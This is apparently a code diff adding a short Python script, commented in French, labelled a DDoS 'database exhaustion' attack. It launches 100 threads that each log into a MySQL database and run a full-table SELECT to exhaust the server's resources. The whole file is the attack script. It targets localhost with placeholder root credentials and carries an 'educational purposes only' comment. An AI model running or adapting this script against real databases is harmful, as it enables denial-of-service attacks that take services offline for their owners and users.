@@ -1,0 +1,38 @@
+# DDOS - Attaques par épuisement des ressources applicatives (Database Exhaustion)
+
+import threading
+import mysql.connector
+
+def database_exhaustion(target_db, query, num_threads):
+    print(f"Lancement d'une attaque Database Exhaustion sur {target_db}...")
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_sql_query, args=(target_db, query))
+        thread.start()
+
+def send_sql_query(target_db, query):
+    try:
+        conn = mysql.connector.connect(
+            host=target_db["host"],
+            user=target_db["user"],
+            password=target_db["password"],
+            database=target_db["database"]
+        )
+        cursor = conn.cursor()
+        cursor.execute(query)
+        cursor.close()
+        conn.close()
+    except Exception as e:
+        print(f"Erreur lors de l'envoi de la requête SQL: {e}")
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_db = {
+    "host": "localhost",
+    "user": "root",
+    "password": "password",
+    "database": "test_db"
+}
+query = "SELECT * FROM large_table WHERE 1=1"  # Requête SQL complexe
+num_threads = 100  # Nombre de threads pour simuler une attaque
+
+# Lancer l'attaque simulée
+database_exhaustion(target_db, query, num_threads)
